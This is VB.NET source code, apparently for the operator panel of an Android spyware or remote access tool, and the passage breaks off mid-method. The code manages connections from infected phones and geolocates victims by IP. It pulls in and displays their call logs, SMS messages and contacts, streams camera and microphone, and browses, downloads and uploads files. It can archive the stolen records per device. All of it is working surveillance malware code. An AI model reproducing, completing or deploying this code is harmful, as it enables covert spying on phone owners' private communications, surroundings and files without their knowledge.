Imports WinMM

Namespace sockets
    Public NotInheritable Class Data

        Public Shared SyncWorkerRemove As Object = New Object()

        Public Shared SyncClientsOnline As Object = New Object()

        Public Shared SyncRequestsReceiver As Object = New Object()

        Public Shared SyncListWorker As Object = New Object()

        Public Shared SyncWorkerRequests As Object = New Object()

        Public Shared SyncNotifications As Object = New Object()

        Public Shared SPL_SOCKET, SPL_DATA, SPL_LINE, SPL_ARRAY As String

        Public Shared angelform As AngelAndroidForm

        Public Shared GeoIP0 As GeoIP

        Public Shared imageFlags As New ImageList()

        Public Shared nReport As Report

        Shared Sub New()

            SecurityKey.Createkeys()

            Data.nReport = New Report()

            Data.nReport.Show()

            Data.GeoIP0 = New GeoIP(reso.res_Path & "\GeoIP\GeoIP.dat")

            Data.SPL_SOCKET = "x0F0x"

            Data.SPL_DATA = "x0D0x"

            Data.SPL_LINE = "x0L0x"

            Data.SPL_ARRAY = "x0A0x"


#Region " imageList Flags "

            Dim b As Boolean = False

            Dim Files_List_Flag As String() = IO.Directory.GetFiles(reso.res_Path & "\GeoIP\Flags")

            Dim i As String

            For Each i In Files_List_Flag

                If b = False Then

                    If SpySettings.FLAGS_Size = "32px" Then

                        imageFlags.ImageSize = New Size(32, 32)

                    ElseIf SpySettings.FLAGS_Size = "24px" Then

                        imageFlags.ImageSize = New Size(24, 24)

                    Else

                        imageFlags.ImageSize = New Size(16, 16)

                    End If


                    imageFlags.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit

                    b = True

                End If

                Dim FilePath As String = i

                Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)

                imageFlags.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))

            Next
#End Region

        End Sub
        Public Shared Function Dir(ByVal uuid As String) As String

            Dim FolderALL As String = reso.res_Path & "\" & reso.users

            Dim FolderUSER As String = FolderALL & "\" & uuid

            If Not IO.Directory.Exists(FolderALL) Then

                IO.Directory.CreateDirectory(FolderALL)

            End If

            If Not IO.Directory.Exists(FolderUSER) Then

                IO.Directory.CreateDirectory(FolderUSER)

            End If

            Return FolderUSER

        End Function

        Public Delegate Sub Delegatex(ByVal ParametersObject As Object)
        Public Shared Async Sub Data_0(ByVal ParametersObject As Object)

            If DirectCast(Data.angelform, Windows.Forms.Control).IsDisposed Then

                Exit Sub

            Else

                Dim ClassClient As sockets.Client = DirectCast(ParametersObject(0), sockets.Client)

                Dim bByte As Byte() = DirectCast(ParametersObject(1), Byte())

                Dim SizeData As Array = DirectCast(ParametersObject(2), Array)

                Dim Client As Net.Sockets.TcpClient = CType(ParametersObject(3), Net.Sockets.TcpClient)

                '########################################################################

                Dim SPLByte As Array = Codes.SplitByte(bByte, SizeData)

                Dim EncodString As String = Codes.Encoding().GetString(SPLByte.GetValue(0))

                Dim getCase As String = If(EncodString.Contains(Data.SPL_ARRAY), EncodString.Split({Data.SPL_ARRAY}, StringSplitOptions.None)(0), EncodString) 'fix


                If getCase.Trim = "-0" Then ' للاصدار 1 
                    getCase = "-255"
                End If

                Select Case getCase.Trim

                    Case CStr(reso.plug.Count)

                        ClassClient.Keys = Codes.Encoding().GetString(SPLByte.GetValue(1))
                        Dim getKey As String() = ClassClient.Keys.Split(":")
                        Dim obj As Object() = {Client, SecurityKey.KeysClient1 & Data.SPL_SOCKET & reso.domen & ".info" & Data.SPL_SOCKET & "method" & Data.SPL_SOCKET & SecurityKey.getinfo & Data.SPL_SOCKET & "info" & Data.SPL_DATA & getKey(2) & Data.SPL_DATA & getKey(5), Codes.Encoding().GetBytes("null"), ClassClient}
                        ClassClient.Send(obj)

                        Return

                    Case "-255"

                        If ClassClient IsNot Nothing Then

                            Dim DataStatistics As String = CStr(Codes.Encoding().GetString(SPLByte.GetValue(1)))

                            Dim SCREEN As Boolean = If(DataStatistics = "25", True, False)

                            If SCREEN Then

                                GoTo H

                            End If

                            If DataStatistics.Trim.Length = 0 And DataStatistics.Length = 1 Then '\t Final warning ' 45s

                                Dim Obj As Object() = {Client, SecurityKey.SHOT, Codes.Encoding().GetBytes(SecurityKey.SHOT), ClassClient}

                                ClassClient.Async6(Obj) ' +

                            Else

                                If DataStatistics.Length > 1 Then

                                    Dim ar As String() = Codes.GetStatistics(DataStatistics)

                                    If Not ar(0).Length = 0 And Not ar(1).Length = 0 Then

                                        ClassClient.Statistics = String.Format("{0} ms , {1} loss", ar(0), ar(1))

                                    End If

                                End If

                            End If

H:

                            If SCREEN Then

                                Dim obj_Upd As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getUpdate & sockets.Data.SPL_SOCKET & "update", Codes.Encoding().GetBytes("null"), ClassClient}

                                ClassClient.Send(obj_Upd)


                            Else

                                If ClassClient.Rows Is Nothing Then
                                    If ClassClient.CountPoing >= 2 Then ' 45000 *2  
                                        Dim objFix As Object() = {Client, SecurityKey.KeysClient11 & sockets.Data.SPL_SOCKET & "null", Codes.Encoding().GetBytes("null"), ClassClient}
                                        ClassClient.Send(objFix)
                                        ClassClient.CountPoing = 0
                                    Else
                                        ClassClient.CountPoing += 1
                                    End If
                                Else
                                    ClassClient.CountPoing = 0
                                End If

                            End If


                        End If

                        '--->
                        '------>
                        '--------->
                        Return

                    Case "-1"

                        ClassClient.Keys = Codes.Encoding().GetString(SPLByte.GetValue(1))
                        Dim injection As String = Data.SPL_SOCKET & SecurityKey.KeysClient1 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient2 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient3 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient4 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient5 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient6 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient7 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient8 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient9 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient10 _
                            & Data.SPL_SOCKET & SecurityKey.KeysClient11 _
                            & Data.SPL_SOCKET & SecurityKey.KeysGetClient _
                            & Data.SPL_SOCKET & SecurityKey.resultClient

                        If reso.plug.Count > 0 Then

                            For Each pl In reso.plug

                                Dim plg As Array = DirectCast(pl, Array)

                                Dim obj As Object() = {Client, "0" & Data.SPL_SOCKET & plg(0) & Data.SPL_SOCKET & plg(1) & Data.SPL_SOCKET & plg(2) & Data.SPL_SOCKET & plg(3) & Data.SPL_SOCKET & plg(5) & injection, plg(4), ClassClient, True}

                                ClassClient.Send(obj)

                            Next

                        End If

                        Return

                    Case SecurityKey.KeysGetClient

                        Dim getKey As String() = ClassClient.Keys.Split(":")

                        Dim obj As Object() = {Client, SecurityKey.KeysClient1 & Data.SPL_SOCKET & reso.domen & ".info" & Data.SPL_SOCKET & "method" & Data.SPL_SOCKET & SecurityKey.getinfo & Data.SPL_SOCKET & "info" & Data.SPL_DATA & getKey(2) & Data.SPL_DATA & getKey(5), Codes.Encoding().GetBytes("null"), ClassClient}

                        ClassClient.Send(obj)

                        Return

                End Select

                If Data.angelform.InvokeRequired Then

                    Data.angelform.Invoke(New Delegatex(AddressOf Data.Data_0), New Object() {ParametersObject})

                    Exit Sub

                Else

                    Select Case getCase.Trim

                        Case SecurityKey.getUpdate

                            Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                            ClassClient.Wallpaper(0) = reso.Wallpaper(SPL(1), reso.IconsSize, reso.IconsSize, SPL(2), ClassClient.power, ClassClient.VersionClient)

                            ClassClient.Wallpaper(1) = SPL(1)

                            If ClassClient.Rows IsNot Nothing Then

                                ClassClient.Rows.Cells(0).Value = ClassClient.Wallpaper(0)

                            End If


                        Case SecurityKey.getinfo

                            If ClassClient.Rows Is Nothing Then

                                Try

                                    Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                    Dim getKEY As String() = ClassClient.Keys.Split(":")

                                    ClassClient.Flag = GetFlagThisIp.ThisIp(ClassClient.ClientAddressIP)

                                    ClassClient.Country = GetCountryName.GetCountryName(ClassClient.ClientAddressIP)

                                    ClassClient.ClientName = SPL(5)

                                    ClassClient.UUID = SPL(6)

                                    ClassClient.FolderUSER = Dir(SPL(6))

                                    ClassClient.host = getKEY(6)

                                    ClassClient.VersionClient = reso.GetVersionClient(getKEY)

                                    ClassClient.Wallpaper(0) = reso.Wallpaper(SPL(8), reso.IconsSize, reso.IconsSize, SPL(9), ClassClient.power, ClassClient.VersionClient)

                                    ClassClient.Wallpaper(1) = SPL(8)

                                    reso.Directory_Exist(ClassClient)

                                    'SPL(4) = plg>ver

                                    Dim OBj As Object = {ClassClient.Wallpaper(0), ClassClient.ClientName, SPL(1), SPL(2), SPL(3), ClassClient.Flag, ClassClient.Country, String.Format("{0} P{1}", ClassClient.ClientRemoteAddress, getKEY(1)), SPL(7), ClassClient.VersionClient}

                                    Dim o As Object() = {ClassClient, Client}

                                    If ClassClient.EXI = -1 Then

                                        Return

                                    End If

                                    Dim arrayObjects As Object() = AddRows(o, OBj, ClassClient.UUID)

                                    Dim ID As Integer = CInt(arrayObjects(0))

                                    Dim flag As Boolean = CBool(arrayObjects(1))

                                    Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".apps" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "load" & sockets.Data.SPL_DATA & "n", Codes.Encoding().GetBytes("null"), ClassClient}

                                    ClassClient.Send(objs)

                                    If Not ID = -1 Then

                                        Data.angelform.DGV0.Rows(ID).Cells(6).Tag = ClassClient.ClientRemoteAddress

                                        ClassClient.Rows = Data.angelform.DGV0.Rows(ID)

                                        If Not flag Then

                                            If SpySettings.SOHW_ALERT = "Yes" Then

                                                If Not DirectCast(Data.nReport, Control).IsDisposed Then

                                                    Dim FlagW As Integer = CInt(Data.imageFlags.ImageSize.Width / 2)

                                                    Dim aString As String = "{0}" & vbNewLine & "ip: " & "{1}" & vbNewLine & "name: " & "{2}" & vbNewLine & "release: " & "{3}"

                                                    Data.nReport.AddItem(ClassClient.Flag, String.Format(aString, ClassClient.Country, ClassClient.ClientAddressIP, ClassClient.ClientName, SPL(3)))

                                                End If

                                            End If

                                        End If

                                    End If

                                Catch ex As Exception

                                    Try

                                        If Not ClassClient Is Nothing Then

                                            Dim objs As Object() = {Client, SecurityKey.KeysClient5 & sockets.Data.SPL_SOCKET & "10000", Codes.Encoding().GetBytes("null"), ClassClient}

                                            ClassClient.Rows = Nothing

                                            ClassClient.Send(objs)

                                        End If

                                    Catch skip As Exception

                                    End Try

                                End Try

                            End If

                        Case SecurityKey.getCalls

                            Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "Calls_Manager_" & ClassClient.ClientRemoteAddress

                                Dim CallsManager As CallsManager = My.Application.OpenForms(handle)

                                If CallsManager Is Nothing Then

                                    CallsManager = New CallsManager

                                    CallsManager.Name = handle

                                    CallsManager.Title = String.Format("{0} - IP:{1}", "Calls Manager", ClassClient.ClientAddressIP)

                                    CallsManager.Client = Client

                                    CallsManager.classClient = ClassClient

                                    CallsManager.tmpAddressIP = ClassClient.ClientAddressIP

                                    CallsManager.tmpClientName = ClassClient.ClientName

                                    CallsManager.tmpCountry = ClassClient.Country

                                    CallsManager.tmpFolderUSER = ClassClient.FolderUSER

                                    CallsManager.DGV0.Columns(5).Width = reso.IconsSize

                                    CallsManager.DGV0.Columns(5).DisplayIndex = 0

                                    DirectCast(CallsManager, Control).Show()

                                End If

                                CallsManager.DGV0.Enabled = False

                                CallsManager.DGV0.Rows.Clear()

                                Dim Counter As Integer = 0

                                For Each ea In SPL_lines

                                    Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)

                                    Dim getPath As String = Nothing
                                    Select Case ay(2)
                                        Case "Incoming"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\Incoming.png"
                                        Case "Outgoing"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\Outgoing.png"
                                        Case "Missed"
                                            getPath = reso.res_Path & "\Icons\FillEllipse\Missed.png"
                                        Case Else
                                            getPath = reso.res_Path & "\Icons\FillEllipse\null.png"
                                    End Select

                                    Dim id As Integer = CallsManager.DGV0.Rows.Add(ay(0), ay(1), ay(2), ay(3), Codes.Duration(ay(4)), reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))

                                    CallsManager.DGV0.Rows(id).Tag = ay(5)

                                    CallsManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                CallsManager.DGV0.Enabled = True

                                CallsManager.PB.Value = 0

                                If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {CallsManager.DGV0, ClassClient.FolderUSER, "Calls Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Call Log", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If

                            Catch ex As Exception

                            End Try
                        Case SecurityKey.getSMS


                            Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "SMS_Manager_" & ClassClient.ClientRemoteAddress

                                Dim SMSManager As SMSManager = My.Application.OpenForms(handle)

                                If SMSManager Is Nothing Then

                                    SMSManager = New SMSManager

                                    SMSManager.Name = handle

                                    SMSManager.Title = String.Format("{0} - IP:{1}", "SMS Manager", ClassClient.ClientAddressIP)

                                    SMSManager.Client = Client

                                    SMSManager.classClient = ClassClient

                                    SMSManager.tmpAddressIP = ClassClient.ClientAddressIP

                                    SMSManager.tmpClientName = ClassClient.ClientName

                                    SMSManager.tmpCountry = ClassClient.Country

                                    SMSManager.tmpFolderUSER = ClassClient.FolderUSER

                                    SMSManager.DGV0.Columns(5).Width = reso.IconsSize

                                    SMSManager.DGV0.Columns(5).DisplayIndex = 0

                                    DirectCast(SMSManager, Control).Show()

                                End If

                                SMSManager.DGV0.Enabled = False

                                SMSManager.DGV0.Rows.Clear()

                                Dim path As String = Nothing

                                Dim Counter As Integer = 0

                                For Each ea In SPL_lines

                                    Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)

                                    Dim idRow As Integer = SMSManager.DGV0.Rows.Add(ay(0), ay(1), ay(2), ay(3), ay(5), reso.GetEllImage(1, {ay(1), ay(0), "<->", Nothing, Nothing}))

                                    SMSManager.DGV0.Rows(idRow).Tag = ay(4)

                                    path = ay(5)

                                    SMSManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                SMSManager.DGV0.Enabled = True

                                SMSManager.PB.Value = 0

                                If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {SMSManager.DGV0, ClassClient.FolderUSER, "SMS Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "SMS", "sms", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If

                            Catch ex As Exception

                            End Try
                        Case SecurityKey.getContacts

                            Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "Contacts_Manager_" & ClassClient.ClientRemoteAddress

                                Dim ContactsManager As ContactsManager = My.Application.OpenForms(handle)

                                If ContactsManager Is Nothing Then

                                    ContactsManager = New ContactsManager

                                    ContactsManager.Name = handle

                                    ContactsManager.Title = String.Format("{0} - IP:{1}", "Contacts Manager", ClassClient.ClientAddressIP)

                                    ContactsManager.Client = Client

                                    ContactsManager.classClient = ClassClient

                                    ContactsManager.tmpAddressIP = ClassClient.ClientAddressIP

                                    ContactsManager.tmpClientName = ClassClient.ClientName

                                    ContactsManager.tmpCountry = ClassClient.Country

                                    ContactsManager.tmpFolderUSER = ClassClient.FolderUSER

                                    ContactsManager.DGV0.Columns(3).Width = reso.IconsSize

                                    ContactsManager.DGV0.Columns(3).DisplayIndex = 0

                                    DirectCast(ContactsManager, Control).Show()

                                End If

                                ContactsManager.DGV0.Enabled = False

                                ContactsManager.DGV0.Rows.Clear()

                                Dim Counter As Integer = 0

                                For Each ea In SPL_lines

                                    Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)

                                    Dim id As Integer = ContactsManager.DGV0.Rows.Add(ay(0), ay(1), ay(2), reso.GetEllImage(1, {ay(0), Nothing, Nothing, Nothing, Nothing}))

                                    ContactsManager.DGV0.Rows(id).Tag = ay(3)

                                    ContactsManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                ContactsManager.DGV0.Enabled = True

                                ContactsManager.PB.Value = 0

                                If SpySettings.SAVING_DATA = "Yes" Then
                                    reso.Directory_Exist(ClassClient)
                                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf reso.SAVEit), {ContactsManager.DGV0, ClassClient.FolderUSER, "Contacts Manager",
                                        ClassClient.ClientName, ClassClient.Country & " - " & ClassClient.ClientAddressIP, "Contacts", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
                                End If

                            Catch ex As Exception

                            End Try
                        Case SecurityKey.getCamera

                            Try

                                If ClassClient.qit = True Then

                                    Return

                                End If

                                Dim SPL As String() = EncodString.Split({SPL_ARRAY}, StringSplitOptions.None)

                                Dim ob As Object() = Data.GetCollection(SPL(1))

                                Dim handle As String = "Camera_Manager_" & DirectCast(ob(0), sockets.Client).ClientRemoteAddress

                                Dim CameraManager As CameraManager = My.Application.OpenForms(handle)

                                If CameraManager Is Nothing Then

                                    CameraManager = New CameraManager

                                    CameraManager.Name = handle

                                    CameraManager.Title = String.Format("{0} - IP:{1}", "Camera Manager", ClassClient.ClientAddressIP)

                                    CameraManager.classClient = DirectCast(ob(0), sockets.Client)

                                    If CameraManager.classClient IsNot Nothing Then

                                        reso.Directory_Exist(CameraManager.classClient)

                                        CameraManager.tmpFolderUSER = CameraManager.classClient.FolderUSER

                                    End If

                                    CameraManager.Client = DirectCast(ob(1), Net.Sockets.TcpClient)

                                    CameraManager.CameraClient = Client

                                    CameraManager.classCamera = ClassClient

                                    CameraManager.TempImage = New PictureBox

                                    DirectCast(CameraManager, Control).Show()

                                End If

                                Dim Byte_ As Byte() = DirectCast(SPLByte.GetValue(1), Byte())

                                Dim MS As New IO.MemoryStream(Byte_)

                                Dim bmp As Bitmap = Image.FromStream(MS)


                                CameraManager.CAM0.Image = Effect(CameraManager.RotateFlip(bmp))

                                If CameraManager.MaximumSize.Height = 0 And CameraManager.MaximumSize.Width = 0 Then
                                    CameraManager.MaximumSize = New Size(CameraManager.CAM0.Image.Size)
                                End If

                                If Not CameraManager.Size = CameraManager.CAM0.Image.Size Then
                                    If Not CameraManager.CAM0.Tag = CameraManager.TempImage.Tag Then
                                        CameraManager.CAM0.Tag = CameraManager.TempImage.Tag
                                        CameraManager.MaximumSize = New Size(0, 0)
                                        CameraManager.Size = New Size(CameraManager.Size)
                                        CameraManager.MaximumSize = New Size(CameraManager.CAM0.Image.Size)
                                    End If
                                End If

                                CameraManager.FPSTMP += 1

                                CameraManager.SizeFrame = reso.BytesConverter(Byte_.Length)

                            Catch ex As Exception

                            End Try

                        Case SecurityKey.getfiles

                            Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_DATA}, StringSplitOptions.None)

                                Dim SPL_lines As String() = SPL(1).Split({SPL_LINE}, StringSplitOptions.RemoveEmptyEntries)

                                Dim handle As String = "File_Manager_" & ClassClient.ClientRemoteAddress

                                Dim FileManager As FileManager = My.Application.OpenForms(handle)

                                If FileManager Is Nothing Then

                                    FileManager = New FileManager

                                    FileManager.Name = handle

                                    FileManager.Title = String.Format("{0} - IP:{1}", "File Manager", ClassClient.ClientAddressIP)

                                    FileManager.Client = Client

                                    FileManager.classClient = ClassClient

                                    FileManager.ver = ClassClient.VersionClient

                                    FileManager.DGV0.AutoGenerateColumns = False

                                    FileManager.DGV0.Columns(5).DisplayIndex = 0

                                    DirectCast(FileManager, Control).Show()

                                End If


                                FileManager.DGV0.Enabled = False

                                FileManager.DGV0.Rows.Clear()

                                Dim idx As Integer = FileManager.DGV0.Rows.Add("..", Nothing, Nothing, Nothing, Nothing, getIconFrmReg.GetIcon(reso.res_Path, If(SpySettings.FM_IC_Size = "Large", True, False)))

                                FileManager.DGV0.Rows(idx).Cells(0).Tag = "back"

                                Dim Counter As Integer = 0

                                For Each ea In SPL_lines

                                    Dim ay As String() = ea.Split({SPL_ARRAY}, StringSplitOptions.None)

                                    If ay(0) = "-1" Then

                                        FileManager.DGV0.Tag = ay(1)

                                        Exit For

                                    End If

                                    FileManager.DGV0.Tag = ay(4)

                                    Dim exType As String = "n/a"

                                    If ay(1) = "0" Then

                                        exType = String.Format("Folder Files ({0})", ay(7))

                                    ElseIf ay(1) = "1" Then

                                        exType = "File"

                                    End If

                                    Dim ti As String = ay(5)

                                    Dim ne As String = "no"

                                    If ti.Trim = ay(6).Trim Then

                                        ne = "yes"

                                    End If

                                    Dim FileSize As String = Space(1)

                                    If exType = "File" Then

                                        FileSize = reso.BytesConverter(CLng(ay(3)))

                                    End If

                                    Dim Extens As String = ".null"

                                    Try

                                        Dim info As New IO.FileInfo(ay(2))

                                        Extens = info.Extension.ToLower

                                        If Not Extens.Contains(".") Then
                                            Extens = ".null"
                                        End If

                                    Catch ex As Exception

                                    End Try

                                    Dim id As Integer = FileManager.DGV0.Rows.Add(exType, ay(2), FileSize, ay(5), ay(6), If(ay(1) = "0", getIconFrmReg.GetIcon(reso.res_Path, If(SpySettings.FM_IC_Size = "Large", True, False)), getIconFrmReg.GetFileIcon(Extens)))

                                    FileManager.DGV0.Rows(id).Cells(2).Tag = ay(3)

                                    If ne = "yes" Then

                                        FileManager.DGV0.Rows(id).DefaultCellStyle.ForeColor = SpySettings.DefaultColor_NewColorFiles

                                    End If

                                    FileManager.DGV0.Rows(id).Cells(0).Tag = ay(1)

                                    FileManager.PB.Value = Codes.RateConverter(Counter, SPL_lines.Length - 1)

                                    Counter += 1

                                    Application.DoEvents()

                                Next

                                FileManager.DGV0.Enabled = True

                                FileManager.PB.Value = 0

                                FileManager.Text = FileManager.Title & Space(1) & FileManager.DGV0.Tag

                            Catch ex As Exception

                            End Try
                        Case SecurityKey.down_info


                            Try
                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_ARRAY}, StringSplitOptions.None)

                                Dim nameFolder As String = "Downloads"

                                If CLng(SPL(1)) = 0 Then

                                    Dim start As Integer = SPL(0).LastIndexOf("/")

                                    Dim down As String = reso.res_Path & "\" & reso.users & "\" & SPL(2) & "\" & nameFolder

                                    If Not IO.Directory.Exists(down) Then

                                        IO.Directory.CreateDirectory(down)

                                    End If

                                    down = down & "\" & SPL(0).Substring(start + 1)

                                    Try

                                        If IO.File.Exists(down) Then

                                            IO.File.Delete(down)

                                        End If

                                        IO.File.Create(down).Close()

                                    Catch

                                    End Try

                                    Return

                                End If

                                Dim handle As String = "Download_" & ClassClient.ClientRemoteAddress

                                Dim Download As Download = My.Application.OpenForms(handle)

                                If Download Is Nothing Then

                                    Download = New Download

                                    Download.Name = handle

                                    Download.Title = String.Format("{0} - IP:{1}", "Download", ClassClient.ClientAddressIP)

                                    Download.Client = Client

                                    Download.classClient = ClassClient

                                    Dim start As Integer = SPL(0).LastIndexOf("/")

                                    Download.xName = SPL(0).Substring(start + 1)

                                    Download.DownFolder = reso.res_Path & "\" & reso.users & "\" & SPL(2) & "\" & nameFolder

                                    Download.DGV0.Rows.Add("Name --->", Download.xName)

                                    Download.DGV0.Rows.Add("Path --->", SPL(0))

                                    Download.DGV0.Rows.Add("Size --->", reso.BytesConverter(CLng(SPL(1))))

                                    Download.DGV0.Rows.Add("Time --->", "...")

                                    Download.ProgressBar1.Maximum = CInt(SPL(1))

                                    Download.start_time = Now

                                    Download.TotalSize = CLng(SPL(1))

                                    DirectCast(Download, Control).Show()

                                End If

                            Catch ex As Exception

                            End Try

                        Case SecurityKey.downByte

                            If ClassClient.qit = True Then

                                Return

                            End If

                            Dim handle As String = "Download_" & ClassClient.ClientRemoteAddress

                            Dim Download As Download = My.Application.OpenForms(handle)

                            If Download IsNot Nothing Then

                                Try

                                    Dim down As String = Download.DownFolder

                                    If Not IO.Directory.Exists(down) Then

                                        IO.Directory.CreateDirectory(down)

                                    End If

                                    down = down & "\" & Download.xName

                                    If Download.FileStream Is Nothing And Download._stream = 0 Then

                                        Download.FileStream = New System.IO.FileStream(down, IO.FileMode.OpenOrCreate, IO.FileAccess.Write)

                                    End If

                                    Dim Byte_ As Byte() = DirectCast(SPLByte.GetValue(1), Byte())

                                    Download.FileStream.Write(Byte_, 0, Byte_.Length)

                                    Download._stream += Byte_.Length

                                    Download.ProgressBar1.Value = Download._stream



                                Catch ex As Exception

                                Finally

                                    If Download._stream = Download.TotalSize Then

                                        If Download.FileStream IsNot Nothing Then

                                            Download.FileStream.Dispose()

                                            Download.FileStream.Close()

                                            Download.FileStream = Nothing

                                        End If

                                        Download._stream = 0

                                        ClassClient.Close(Client)

                                        Download.Close()

                                    End If

                                End Try

                            End If

                        Case SecurityKey.upload_info

                            ClassClient.shot = False

                            Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_ARRAY}, StringSplitOptions.None)

                            If IO.File.Exists(SPL(3)) Then

                                Try

                                    Dim handle As String = "Upload_" & ClassClient.ClientRemoteAddress

                                    Dim Upload As Upload = My.Application.OpenForms(handle)

                                    If Upload Is Nothing Then

                                        Upload = New Upload

                                        Upload.Name = handle

                                        Upload.Title = String.Format("{0} - IP:{1}", "Upload", ClassClient.ClientAddressIP)

                                        Upload.SPL = SPL

                                        Upload.Client = Client

                                        Upload.classClient = ClassClient

                                        Upload.DGV0.Rows.Add("Name --->", SPL(2))

                                        Upload.DGV0.Rows.Add("Path to --->", SPL(0))

                                        Upload.DGV0.Rows.Add("Path From --->", SPL(3))

                                        Upload.DGV0.Rows.Add("Size --->", reso.BytesConverter(CLng(SPL(1))))

                                        Upload.DGV0.Rows.Add("Time --->", "...")

                                        Upload.ProgressBar1.Maximum = CInt(SPL(1))

                                        Upload.start_time = Now

                                        Upload.TotalSize = CLng(SPL(1))

                                        DirectCast(Upload, Control).Show()

                                    End If

                                Catch ex As Exception

                                End Try

                            Else

                                ClassClient.Close(Client)

                            End If


                        Case SecurityKey.MicwaveinByte

                            Try

                                Dim SPL As String() = Codes.Encoding().GetString(SPLByte.GetValue(1)).Split({SPL_ARRAY}, StringSplitOptions.None)

                                Dim ob As Object() = Data.GetCollection(SPL(1))

                                Dim clas As sockets.Client = DirectCast(ob(0), sockets.Client)

                                Dim handle As String = "Microphone_" & clas.ClientRemoteAddress

                                Dim Microphone As Microphone = My.Application.OpenForms(handle)

                                If Microphone IsNot Nothing Then

                                    Microphone.classWaveIn = ClassClient

                                    Microphone.classWaveIn.shot = False

                                    Microphone.ClientWaveIn = Client

                                    Microphone.rateInput = CInt(SPL(2).Trim)

                                    Microphone.In_Start(Microphone.MDeviceId)

                                End If


                            Catch ex As Exception

                            End Try
                        Case SecurityKey.MicwaveOutByte

                            If ClassClient.qit = True Then

                                Return

                            End If

                            Try

                                Dim SPL As String() = EncodString.Split({SPL_ARRAY}, StringSplitOptions.None)

                                Dim ob As Object() = Data.GetCollection(SPL(1))

                                Dim handle As String = "Microphone_" & DirectCast(ob(0), sockets.Client).ClientRemoteAddress

                                Dim Microphone As Microphone = My.Application.OpenForms(handle)

                                If Microphone Is Nothing Then

                                    Microphone = New Microphone

                                    Microphone.Name = handle

                                    Microphone.Title = String.Format("{0} - IP:{1}", "Microphone", ClassClient.ClientAddressIP)

                                    DirectCast(Microphone, Control).Show()

                                End If


                                If Microphone.waveOut Is Nothing Then


                                    Microphone.classClient = DirectCast(ob(0), sockets.Client)

                                    Microphone.Client = DirectCast(ob(1), Net.Sockets.TcpClient)

                                    Microphone.ClientWaveOut = Client

                                    Microphone.classWaveOut = ClassClient

                                    Microphone.classWaveOut.shot = False

                                    Try

                                        Microphone.waveOut = New WaveOut(0)

                                        Microphone.waveOut.Open(reso.FormatWave(SPL(2)))

                                    Catch ex As Exception

                                        Microphone.Out_Stop()

                                        Microphone.Panel1.Visible = False

                                        Microphone.SizeH()

                                    End Try

                                    Microphone.OutHZ.Text = reso.HzString(SPL(2))

                                    Microphone.OutBoxSource.SelectedIndex = CInt(SPL(3).Trim)

                                    If Microphone.b_sta.Tag = 1 Then

                                        Microphone.b_sta.Tag = 2

                                        Microphone.b_sta.Text = "Stop"

                                    End If

                                End If

